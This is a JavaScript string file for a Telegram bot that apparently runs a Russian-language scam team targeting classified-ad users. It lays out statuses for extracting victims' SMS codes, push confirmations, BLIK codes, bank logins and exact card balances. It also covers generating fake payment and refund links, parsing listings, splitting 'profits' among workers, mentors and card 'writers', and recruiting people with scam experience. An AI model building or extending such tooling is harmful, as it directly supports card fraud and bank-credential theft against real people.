module.exports = {
  statuses: {
    sms: "📥 СМС-КОД",
    lk: "🔐 ЛК",
    push: "📱 ПУШ",
    blik: "#️⃣ БЛИК",
    appCode: "📬 КОД С ПРИЛОЖЕНИЯ",
    callCode: "☎️ КОД ИЗ ЗВОНКА",
    picture: "🖼 КАРТИНКА",
    limits: "⚠️ ЛИМИТЫ",
    otherCard: "⚠️ ДРУГАЯ КАРТА",
    correctBalance: "⚠️ ТОЧНЫЙ БАЛАНС",
    forVerify: "⚠️ НУЖЕН БАЛАНС",
  },
  workerStatuses: {
    push: "📲 Вашему человеку отправили ПУШ",
    sms: "📤 Вашему человеку отправили СМС-КОД",
    lk: "🔐 Вашего человека отправили на ЛК",
    blik: "📩 Вашему человеку отправили БЛИК",
    callCode: "☎️ Вашему человеку отправили звонок с кодом",
    appCode: "📬 Вашему человеку отправили код в приложение",
    picture: "🖼 Вашему человеку отправили картинку",
    limits: "⚠️ Ваш человек должен поднять лимиты",
    otherCard: "⚠️ Ваш человек должен ввести другую карту",
    forVerify: "⚠️ У вашего человека должен быть баланс на карте",
    correctBalance: "⚠️ Ваш человек должен ввести точный баланс",
  },
  wrongWorkerStatuses: {
    code: "❌ Ваш человек ввёл неверный КОД",
    lk: "❌ Ваш человек ввёл неверные данные от ЛК",
    picture: "❌ Ваш человек выбрал неверную КАРТИНКУ",
    push: "❌ Ваш человек не подтверждает ПУШ",
  },
  newProfit: {
    channel: `<b>💰 НОВЫЙ ПРОФИТ: {serviceTitle}</b>
🔑 ID: <b>{profitId}</b>
💸 Сумма: <b>{amount}</b>
📊 Процент воркера: <b>{workerAmount}</b>
👤 Воркер: <b>{worker}</b>
✍️ Вбивер: <b>{writer}</b>`,
    channelReferal: `<b>💰 ВЫПЛАТА ПО РЕФЕРАЛКЕ</b>
🔑 ID: <b>{profitId}</b>
💸 Сумма: <b>{amount}</b>
👤 Воркер: <b>{worker}</b>`,
    channelMentor: `<b>💰 ВЫПЛАТА МЕНТОРУ</b>
🔑 ID: <b>{profitId}</b>
💸 Сумма: <b>{amount}</b>
👤 Ментор: <b>{worker}</b>`,
    wait: "⏳ В ожидании",
    payed: "✅ Выплачено",
    razvitie: "🌎 На развитие",
    worker: `<b>🎉 Вам засчитан профит #{profitId} в размере {amount}</b>
💰 Ваш процент: <b>{workerAmount}</b>
✍️ Вбивер: <b>{writer}</b>`,
    referral: `<b>🎉 Вам засчитан профит #{profitId} в размере {amount} за реферала</b>`,
    mentor: `<b>🎉 Вам засчитан профит #{profitId} в размере {amount} за наставничество</b>`,
  },
  myAd: {
    text: `<b>📦 Объявление {service}</b>

💬 Название: <b>{title}</b>
💰 Цена: <b>{price}</b>
📰 Имя: <b>{name}</b>
📱 Телефон: <b>{phone}</b>
🏡 Адрес: <b>{address}</b>
💸 Чекер баланса: <b>{balanceChecker}</b>

🔗 Получение оплаты: <b>{fakeLink}</b>
🔗 Возврат: <b>{refundLink}</b>`,
  },
  now_writers: "✍️ Сейчас на вбиве:",
  chat_list: "💬 Список чатов",
  payouts: "💸 Выплаты",
  workers: "👥 Воркеры",
  top_workers: "🏆 Топ воркеров",
  top_null: "🔍 В топе ещё никого нету",
  mainMenu: {
    text: `<b>📊 Профиль!</b>

🔑 Твой ID: <code>{id}</code>
👨‍💻 Статус: <b>{status}</b>
🔖 Никнейм: <b>{hide_nick}</b>
💎 USDT: <b>{USDTWallet}</b>

🛍 Количество объявлений: <b>{ads_count}</b>
💸 Профитов: <b>{profits_count}</b>
💰 Сумма профитов: <b>{profits_sum}</b>

☄️ До PRO осталось: <b>{to_pro}</b>

👨‍🎓 Наставник: <b>{my_mentor}</b>
👨‍💻 Тех. поддержка: <b>{my_support}</b>

<b>⏰ Ты с нами уже {with_us}</b>`,
    buttons: {
      main_menu: "📊 Профиль",
      create_link: "🔗 Создать ссылку",
      my_ads: "🛍 Мои объявления",
      my_profits: "💸 Мои профиты",
      writer: "✍️ Вбиверы",
      workers_top: "🏆 Топ воркеров",
      chats: "💬 Чаты",
      settings: "🔩 Настройки",
      send_sms: "📤 Отправить СМС",
      parse: "🤖 Спарсить объявления",
      my_parsings: "🗃 Мои парсинги",
      instruments: "🧰 Инструменты",
      information: "📖 Информация",
    },
  },
  instruments: {
    referral: "📊 Рефералка",
    mentors: "👨‍🎓 Наставники",
    send_sms: "📲 Отправить СМС",
    send_email: "📨 Отправить E-mail",
    complaint: "📕 Жалоба | Вопрос 📗",
    support: "🗣 Тех. поддержка",
    kassa: "💰 Касса",
    whatsapp: "📞 Ссылка на WhatsApp",
  },
  mentors: {
    mentors_list: "📚 Список наставников",
    change_mentor: "🔧 Сменить/удалить наставника",
    my_anket: "📰 Моя анкета",
    create_anket: "✏️ Создать анкету",
    delete_anket: "❌ Удалить анкету",
    delete_student: "🧹 Удалить ученика",
    anket: `📰 <b>Анкета #{id}</b>

👨‍🎓 <b>Наставник:</b> @{mentorUsername}
🌍 <b>Страны:</b> {countries}
👨‍👨‍👦 <b>Учеников:</b> {students}
📝 <b>Описание:</b>
{text}`,
  },
  choose_country: "🌍 Выберите страну",
  choose_service: "📦 Выберите сервис",
  go_to_menu: "🔙 В меню",
  go_back: "🔙 Назад",
  roles: {
    admin: "Администратор 👑",
    writer: "Вбивер ✍️",
    worker: "Воркер 👷",
    pro: "Профи ☄️",
  },
  requests: {
    need_send_request: "<b>⚠️ Для использования бота необходимо подать заявку. Вы готовы?</b>",
    ready_send_button: "✅ Я готов! Перейти к заполнению заявки",
    wait_request_process: "⏳ Ожидайте рассмотрения вашей заявки",
    done: "✅ Заявка отправлена на рассмотрение администраторами!",
    accepted: "🎉 Поздравляем, ваша заявка принята!",
    declined: "😞 Ваша заявка была отклонена",
    steps: [
      {
        request_text: "Откуда узнал",
        scene_text: `☺️ Хорошо, приступаем к заполнению заявки. Первый вопрос:

<b>Откуда Вы о нас узнали? (Источник)</b>`,
      },
      {
        request_text: "Какой опыт",
        scene_text: `👍 Отлично! Второй вопрос:

<b>Имеется ли у Вас опыт работы в скаме? (Где раньше работали, по каким странам, количество профитов)</b>`,
      },
      {
        request_text: "Сколько времени готов уделять",
        scene_text: `✌️ И последний вопрос:

<b>Сколько времени Вы готовы уделять этой работе?</b>`,
      },
    ],
  },
  your_account_banned: "❌ Ваш аккаунт заблокировали",
  newChatMemberText: "🎉 Добро пожаловать в наш проект, {username}!",
};
